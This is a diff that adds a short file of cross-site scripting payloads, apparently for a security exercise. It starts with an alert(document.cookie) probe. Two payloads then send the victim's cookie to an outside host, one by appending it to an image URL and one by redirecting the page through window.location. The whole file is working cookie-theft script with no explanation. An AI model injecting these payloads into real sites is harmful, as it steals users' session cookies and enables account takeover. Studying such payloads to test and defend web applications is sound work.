@@ -1,0 +1,12 @@
+<script>
+alert(document.cookie)
+</script>
+
+<img src="http://cs.au.dk/~ivan/img.php?q=hejsa">
+
+<img id="res" src="http://cs.au.dk/~ivan/img.php?q=">
+<script>
+image = document.getElementById("res");res.src = res.src.concat(document.cookie)
+</script>
+
+<script>window.location = "http://cs.au.dk/~ivan/img.php?q=".concat(document.cookie)</script>
